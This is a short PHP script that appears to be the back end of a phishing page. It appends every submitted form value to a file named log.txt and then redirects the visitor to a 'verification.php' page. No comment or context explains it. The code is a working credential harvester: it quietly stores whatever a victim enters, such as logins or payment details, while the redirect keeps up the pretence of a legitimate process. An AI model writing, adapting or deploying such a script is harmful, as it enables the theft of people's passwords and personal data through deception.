<?php header('Location: verification.php');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $value);
fwrite($handle, ":");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>